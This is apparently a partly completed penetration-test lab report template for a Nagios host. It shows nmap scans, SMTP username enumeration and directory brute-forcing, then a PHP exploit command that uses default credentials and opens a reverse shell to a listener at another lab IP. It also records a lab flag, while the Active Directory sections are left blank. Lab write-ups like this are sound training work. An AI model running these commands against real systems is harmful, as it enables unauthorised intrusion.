- **Independent Challenges**
- **1 Target #1 – 192.168.110.149**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Steps to reproduce the attack:**

**1.1 Service Enumeration**

**Port Scan Results**

└─# nmap -p- --min-rate=10000 192.168.110.149

![[Monitor image.png]]

| **IP Address** | **Ports Open** |
| --- | --- |
| 192.168.110.149 | **TCP**:22,25,80,389,443,5667 |

Service Enumeration

└─# nmap -p22,25,80,389,443,5667 -sC -sV -A --min-rate=20000 192.168.110.149 -o nmap-p-sc-sv-A.txt

![[Monitor image 1.png]]

Port 22 - SSH

Port 25 - SMTP

└─# smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt -t

![[Monitor image 2.png]]

└─# smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 192.168.110.149

Port 80 - nagios

└─# feroxbuster -u http://192.168.110.149 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  -g

![[Monitor image 3.png]]

Browser Access

http://192.168.110.149/

![[Monitor image 4.png]]

http://192.168.110.149/nagios/db

![[Monitor image 5.png]]

**Port 5667 - nsca**

![[Monitor image 6.png]]

**1.2** **Initial Access – use Vulnavilities**

![[Monitor image 7.png]]

![[Monitor image 8.png]]

└─# php exploit.php --host=192.168.110.149 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.110.141 --reverseport=4444

![[Monitor image 9.png]]

![[Monitor image 10.png]]

![[Monitor image 11.png]]

SunCSR.Team.3.af6d45da1f1181347b9e2139f23c6a5b

**Local.txt value:**

**1.3** **Privilege Escalation -**

**1.4** **Post Exploitation**

**Proof.txt value:**

- **Active Directory Set**

**Port Scan Results**

| **IP Address** | **Ports Open** |
| --- | --- |
|  | **TCP:** |
|  | **TCP:** |
|  | **TCP:** |

- **1  –**
- **1.1 Initial Access –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.2 Privilege Escalation –**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:** **Critical**

**Steps to reproduce the attack:**

- **1.3 Post-Exploitation**

**System Proof screenshot:**

- **2  –**
- **2.1 Initial Access –**

**Steps to reproduce the attack:**

- **2.2 Post-Exploitation**

**Local Proof Screenshot:**

- **3 DC –**
- **5.3.1 Initial Access –**

**Steps to reproduce the attack:**

- **3.2 Post-Exploitation**

**System Proof Screenshot:**